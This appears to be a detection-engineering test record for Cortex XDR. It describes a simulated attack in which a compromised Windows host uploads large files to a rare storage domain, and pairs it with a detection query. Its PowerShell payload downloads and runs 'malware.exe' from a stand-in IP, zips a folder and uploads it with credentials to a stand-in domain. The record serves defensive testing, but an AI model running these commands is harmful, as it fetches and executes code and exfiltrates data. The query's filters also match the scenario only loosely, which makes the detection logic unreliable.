identity.summary: An attacker uses a compromised Windows endpoint to upload large files to a rarely used cloud storage domain, triggering the 'Massive upload to a rare storage or mail domain' alert. Cortex should detec
identity.description: An attacker uses a compromised Windows endpoint to upload large files to a rarely used cloud storage domain, triggering the 'Massive upload to a rare storage or mail domain' alert. Cortex should detect the unusual network activity and file transfer behavior.

payload.code:
powershell -Command "Invoke-WebRequest -Uri 'http://192.0.2.100/malware.exe' -OutFile 'C:\\temp\\malware.exe'"
$process = Start-Process -FilePath 'C:\\temp\\malware.exe' -PassThru
Start-Sleep -Seconds 5
$process | Stop-Process
$env:TEMP = 'C:\\temp'
$zipPath = 'C:\\temp\\data.zip'
Compress-Archive -Path 'C:\\temp\\*' -DestinationPath $zipPath
$webClient = New-Object System.Net.WebClient
$webClient.Credentials = New-Object System.Net.NetworkCredential('user', 'pass')
$webClient.UploadFile('https://rare-storage-domain.com/upload', 'POST', $zipPath)

biocs.name: Unusual File Upload to Rare Storage Domain
biocs.description: Detects when a process uploads files to a rarely used storage domain
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION and event_sub_type = ENUM.NETWORK_OUTBOUND
| filter action_remote_ip = '192.0.2.100'
| filter action_file_path contains 'data.zip'
